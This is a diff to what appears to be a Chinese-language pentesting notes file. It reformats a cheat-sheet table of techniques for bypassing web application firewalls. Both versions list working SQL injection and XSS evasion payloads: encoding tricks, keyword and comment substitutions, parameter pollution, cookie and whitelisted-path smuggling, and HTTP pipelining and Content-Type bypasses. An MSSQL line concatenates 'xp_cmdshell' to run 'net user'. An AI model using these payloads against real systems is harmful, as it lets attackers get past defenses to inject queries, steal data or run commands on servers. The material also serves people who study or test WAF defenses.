@@ -43,49 +43,21 @@ where table_schema='security' /*!12441and*/ table_name='users' -- 1\
 
 ---
 
-| 方法 |                                                                | payload |
-|--------------------------------------|--------------------------------------------------------------------------------|
-| 编码 |                                | 1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==>可对payload进行二次url编码）|
-                                        | 2、Unicode编码：单引号 = %u0027、%u02b9、%u02bc |
-                                        | 3、部分十六进制编码：adminuser = 0x61646D696E75736572 |
-                                        | 4、SQL编码：unicode、HEX、URL、ascll、base64等 |
-                                        | 5、XSS编码：HTML、URL、ASCII、JS编码、base64等 |
-大小写变换                                 select=SELecT
-关键字替换                                 And = &&
-                                          Or = ||
-                                          等于号 = like （或使用’<’ 和 ‘>’ 进行判断）
-                                          if(a,b,c) = case when(A) then B else C end
-                                          substr(str,1,1) = substr (str) from 1 for 1
-                                          limit 1,1 = limit 1 offset 1
-                                          Union select 1,2 = union select * from ((select 1)A join (select 2)B;
-                                          hex()、bin() = ascii()
-                                          sleep() = benchmark()
-                                          concat_ws() = group_concat()
-                                          mid()、substr() = substring()
-                                          @@user = user()
-                                          @@datadir = datadir()
-特殊字符替换（空格或注释绕过）               sqlserver中：/**/、/*|%23--%23|*/ 
-                                          mysql中：%0a、%0a/**/、//*!*//、#A%0a
-特殊字符重写绕过                           selselectect
-多请求拆分绕过                             ?a=[inputa]&b=[inputb]  ===》(参数拼接)  and a=[inputa] and b=[inputb]
-参数放Cookie里面进行绕过                    $_REQUEST（获取参数，会获取GET POST COOKIE）===>  若未检测cookie，我们可以放cookie里面
-使用白名单绕过                             admin dede install等目录特殊目录在白名单内
-                                          URL/xxx.php?id=1 union select …… ===》
-                                          1、URL/xxx.php/admin?id=1 union select……
-                                          2、URL/admin/..\xxx.php?id=1 union select……
-内联注释绕过                               id=1 and 1=1 ===》  id=1/*!and*/1=1
-参数重写绕过                               URL/xx.php?id=1 union select  ===》
-                                          URL/xx.php?id=1&id=union&id=select&id=……&id=
-特殊字符拼接                               mssql中，函数里面可以用+来拼接 ?id=1;exec('maste'+'r..xp'+'_cmdshell'+'"net user"')       
-云waf                                     ===》找真实IP
-http协议绕过                              Content-Type绕过：application/x-www-form-urlencoded è multipart/form-data
-                                         请求方式绕过：更换请求方法
-                                         多Content-Disposition绕过：包含多个Content-Disposition时，中间件与waf取值不同 
-                                         keep-alive（Pipeline）绕过：手动设置Connection:keep-alive（未断开），然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf
-                                         修改编码方式：Charset=xxx进行绕过
- Waf检测限制绕过                          参数溢出
-                                         缓冲区溢出：
-                                         UnIoN SeLeCT ===》 and (select 1)=(Select 0xA*99999) UnIoN SeLeCT and 1=1 ===》 and 1=1 and 99…99999 //此处省略N多个9同网段/ssrf绕过                                       
+| 方法                                      | payload                                                                                                                                                                                                                                                                                                                                                                  |
+|-------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| 编码                                      | 1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==>可对payload进行二次url编码）<br>2、Unicode编码：单引号 = %u0027、%u02b9、%u02bc<br>3、部分十六进制编码：adminuser = 0x61646D696E75736572<br>4、SQL编码：unicode、HEX、URL、ascll、base64等<br>5、XSS编码：HTML、URL、ASCII、JS编码、base64等                                                                           |
+| 大小写变换                                 | select=SELecT<br>关键字替换<br>And = &&<br>Or = \|\|<br>等于号 = like （或使用’<’ 和 ‘>’ 进行判断）<br>if(a,b,c) = case when(A) then B else C end<br>substr(str,1,1) = substr (str) from 1 for 1<br>limit 1,1 = limit 1 offset 1<br>Union select 1,2 = union select * from ((select 1)A join (select 2)B;<br>hex()、bin() = ascii()<br>sleep() = benchmark()<br>concat_ws() = group_concat()<br>mid()、substr() = substring()<br>@@user = user()<br>@@datadir = datadir() |
+| 特殊字符替换（空格或注释绕过）               | sqlserver中：/**/、/\*|%23--%23|\*/ <br>mysql中：%0a、%0a/**/、/\*/\!*//、#A%0a                                                                                                                                                                                                                                                                                                  |
+| 特殊字符重写绕过                           | selselectect                                                                                                                                                                                                                                                                                                                                                             |
+| 多请求拆分绕过                             | ?a=[inputa]&b=[inputb]  ===》(参数拼接)  and a=[inputa] and b=[inputb]                                                                                                                                                                                                                                                                                                   |
+| 参数放Cookie里面进行绕过                    | $_REQUEST（获取参数，会获取GET POST COOKIE）===>  若未检测cookie，我们可以放cookie里面                                                                                                                                                                                                                                                                                     |
+| 使用白名单绕过                             | admin dede install等目录特殊目录在白名单内<br>URL/xxx.php?id=1 union select …… ===》<br>1、URL/xxx.php/admin?id=1 union select……<br>2、URL/admin/..\xxx.php?id=1 union select……                                                                                                                                                                                       |
+| 内联注释绕过                               | id=1 and 1=1 ===》  id=1/\*!and\*/1=1                                                                                                                                                                                                                                                                                                                                    |
+| 参数重写绕过                               | URL/xx.php?id=1 union select  ===》<br>URL/xx.php?id=1&id=union&id=select&id=……&id=                                                                                                                                                                                                                                                                                      |
+| 特殊字符拼接                               | mssql中，函数里面可以用+来拼接 ?id=1;exec('maste'+'r..xp'+'_cmdshell'+'"net user"')                                                                                                                                                                                                                                                                                     |
+| 云waf                                     | ===》找真实IP<br>http协议绕过<br>Content-Type绕过：application/x-www-form-urlencoded è multipart/form-data<br>请求方式绕过：更换请求方法<br>多Content-Disposition绕过：包含多个Content-Disposition时，中间件与waf取值不同<br>keep-alive（Pipeline）绕过：手动设置Connection:keep-alive（未断开），然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf<br>修改编码方式：Charset=xxx进行绕过 |
+| Waf检测限制绕过                          | 参数溢出<br>缓冲区溢出：<br>UnIoN SeLeCT ===》 and (select 1)=(Select 0xA*99999) UnIoN SeLeCT and 1=1 ===》 and 1=1 and 99…99999 //此处省略N多个9同网段/ssrf绕过                                                                                                                                                                                                           |
+                                    
 
 ---
 
